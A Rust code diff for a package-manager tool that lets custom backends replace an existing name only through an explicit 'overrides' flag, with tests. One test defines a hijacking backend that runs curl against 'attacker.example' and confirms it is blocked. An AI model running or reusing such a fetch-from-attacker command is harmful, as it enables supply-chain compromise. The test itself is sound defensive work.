@@ -23,8 +23,13 @@
 //     name_col = 0
 //     version_col = 1
 //
-// Custom backends are registered LAST and never override a built-in (collisions are
-// skipped with a warning), so a stray config can't hijack `apt` or `brew`.
+// Custom backends are registered LAST, and a name already in use is skipped with a warning —
+// so a stray config cannot hijack `apt` or `brew` by being named `apt` or `brew`.
+//
+// A definition may take the name anyway, by saying so: `overrides = true` (Q6). That exists
+// because a manager can change its CLI under us, and the person on that machine should be able
+// to correct it that day rather than wait for a release. Two deliberate acts are required, not
+// one lucky name: the sentence in the definition, and the II.12 approval of the file it is in.
 //
 // **The file is argv a shared repo can execute, so it is II.12's supply-chain surface and
 // goes through the hook ledger** — the same approval a hook needs, not a second mechanism.
@@ -310,6 +315,15 @@ pub struct CustomBackendDef {
     /// How to parse `search` output (defaults to the same as `parser`).
     pub search_parser: Option<ParserSpec>,
 
+    /// Take the name even if something already holds it — a built-in included (Q6).
+    ///
+    /// Default `false`, and that default is the security property: a definition cannot take
+    /// over `apt` by being named `apt`. Overriding is a sentence someone had to write, and
+    /// the file it is written in is already approved through the II.12 ledger, so taking a
+    /// built-in's name costs two deliberate acts rather than one lucky name.
+    #[serde(default)]
+    pub overrides: bool,
+
     // --- U2: the fields that make a custom backend a first-class peer of a built-in. ---
     // Every one is optional, and absent means *this backend cannot answer that* — never *the
     // answer is none*. A backend that cannot list its catalogue is not one whose catalogue is
@@ -563,11 +577,25 @@ pub fn register_custom_backends(
             }
         }
         if reg.get(&def.name).is_some() {
+            if !def.overrides {
+                warn!(
+                    "Skipping custom backend '{}': a backend with that name already exists. \
+                     Add `overrides = true` to that definition if you meant to replace it — \
+                     taking a name has to be said, not achieved by picking it.",
+                    def.name
+                );
+                continue;
+            }
+            // Loud on every run, not once at approval time: the machine is now driving that
+            // name with argv from the config repo, and the day that matters is the day
+            // something goes wrong with it.
             warn!(
-                "Skipping custom backend '{}': a backend with that name already exists",
-                def.name
+                "Custom backend '{}' replaces the backend already registered under that name \
+                 (`overrides = true`). Everything written `{}:…` now runs `{}`.",
+                def.name,
+                def.name,
+                def.binary.as_deref().unwrap_or(&def.name)
             );
-            continue;
         }
         reg.register(Arc::new(build_capabilities(def, exec)));
         count += 1;
@@ -798,6 +826,91 @@ mod tests {
         assert!(caps.is_metadata_provider());
     }
 
+    /// Q6. `overrides = true` replaces whatever already holds the name. Here that is an
+    /// earlier custom definition; `a_definition_that_says_so_replaces_a_built_in` in
+    /// `registry.rs` covers the case the key exists for.
+    #[tokio::test]
+    async fn overrides_replaces_the_definition_that_held_the_name() {
+        let (mock, exec) = mock_exec();
+        let mut reg = BackendRegistry::new();
+
+        let first = CustomBackendDef {
+            name: "paru".into(),
+            install_args: vec!["-S".into()],
+            list_args: vec!["-Qm".into()],
+            ..Default::default()
+        };
+        let second = CustomBackendDef {
+            name: "paru".into(),
+            binary: Some("paru-git".into()),
+            install_args: vec!["-S".into(), "--noconfirm".into()],
+            list_args: vec!["-Qm".into()],
+            overrides: true,
+            ..Default::default()
+        };
+        assert_eq!(
+            register_custom_backends(&mut reg, &exec, vec![first, second]),
+            2,
+            "both definitions were accepted — the second replacing the first"
+        );
+
+        reg.get("paru")
+            .unwrap()
+            .as_installable()
+            .unwrap()
+            .install(&[spec("paru", "jq")], false)
+            .await
+            .unwrap();
+        let calls = mock.get_calls().await;
+        assert!(
+            calls.iter().any(|c| c.starts_with("paru-git -S")),
+            "the second definition did not win: {:?}",
+            calls
+        );
+    }
+
+    /// The default is unchanged and it is the security property: picking a name already in
+    /// use is not enough to take it. Only saying so is.
+    #[tokio::test]
+    async fn a_definition_that_does_not_say_so_cannot_take_a_name() {
+        let (mock, exec) = mock_exec();
+        let mut reg = BackendRegistry::new();
+
+        let first = CustomBackendDef {
+            name: "paru".into(),
+            install_args: vec!["-S".into()],
+            list_args: vec!["-Qm".into()],
+            ..Default::default()
+        };
+        let sneaky = CustomBackendDef {
+            name: "paru".into(),
+            binary: Some("curl".into()),
+            install_args: vec!["http://attacker.example/x".into()],
+            ..Default::default()
+        };
+        assert_eq!(
+            register_custom_backends(&mut reg, &exec, vec![first, sneaky]),
+            1,
+            "a definition without `overrides` took a name already in use"
+        );
+
+        reg.get("paru")
+            .unwrap()
+            .as_installable()
+            .unwrap()
+            .install(&[spec("paru", "jq")], false)
+            .await
+            .unwrap();
+        assert!(
+            !mock
+                .get_calls()
+                .await
+                .iter()
+                .any(|c| c.starts_with("curl ")),
+            "the shadowing definition ran anyway"
+        );
+    }
+
     /// U2: a custom backend gains a capability only when its definition provides the fields
     /// for it — and gains it when it does. Absent stays absent (the safe default), present
     /// makes it a first-class peer.
@@ -849,6 +962,14 @@ mod tests {
             install_args: vec!["allow".into()],
             remove_args: vec!["delete".into(), "allow".into()],
             list_args: vec!["status".into()],
+            ..Default::default()
+        }
+    }
+
+    fn spec(backend: &str, name: &str) -> crate::core::PackageSpec {
+        crate::core::PackageSpec {
+            name: name.into(),
+            backend: backend.into(),
             ..Default::default()
         }
     }
